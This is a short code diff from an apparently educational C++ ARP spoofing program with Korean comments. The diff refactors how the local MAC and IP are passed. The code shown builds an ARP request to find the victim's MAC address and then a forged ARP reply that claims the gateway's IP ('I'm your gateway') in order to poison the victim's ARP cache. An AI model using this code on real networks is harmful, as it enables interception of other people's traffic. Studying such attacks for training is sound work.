@@ -57,7 +57,7 @@ int main(int argc, char* argv[]) {
 	EthArpPacket sendPacket;
 
 	sendPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");  // 브로드캐스트
-	sendPacket.eth_.smac_ = Mac(myMacStr);
+	sendPacket.eth_.smac_ = myMac;
 	sendPacket.eth_.type_ = htons(EthHdr::Arp);
 
 	sendPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -65,8 +65,8 @@ int main(int argc, char* argv[]) {
 	sendPacket.arp_.hln_ = Mac::SIZE;
 	sendPacket.arp_.pln_ = Ip::SIZE;
 	sendPacket.arp_.op_ = htons(ArpHdr::Request);  // 리퀘스트 \('o')/ 브로드캐스트
-	sendPacket.arp_.smac_ = Mac(myMacStr);
-	sendPacket.arp_.sip_ = htonl(Ip(myIpStr));
+	sendPacket.arp_.smac_ = myMac;
+	sendPacket.arp_.sip_ = htonl(myIp);
 	sendPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
 	sendPacket.arp_.tip_ = htonl(senderIp);
 
@@ -106,7 +106,7 @@ int main(int argc, char* argv[]) {
 
     // 변조된 ARP Reply 패킷 제작
 	sendPacket.eth_.dmac_ = senderMac;
-	sendPacket.eth_.smac_ = Mac(myMacStr);
+	sendPacket.eth_.smac_ = myMac;
 	sendPacket.eth_.type_ = htons(EthHdr::Arp);
 
 	sendPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -114,7 +114,7 @@ int main(int argc, char* argv[]) {
 	sendPacket.arp_.hln_ = Mac::SIZE;
 	sendPacket.arp_.pln_ = Ip::SIZE;
 	sendPacket.arp_.op_ = htons(ArpHdr::Reply);  // 리플라이 \\('v') 유니캐스트
-	sendPacket.arp_.smac_ = Mac(myMacStr);
+	sendPacket.arp_.smac_ = myMac;
 	sendPacket.arp_.sip_ = htonl(targetIp);  // I'm your gateway
 	sendPacket.arp_.tmac_ = senderMac;
 	sendPacket.arp_.tip_ = htonl(senderIp);
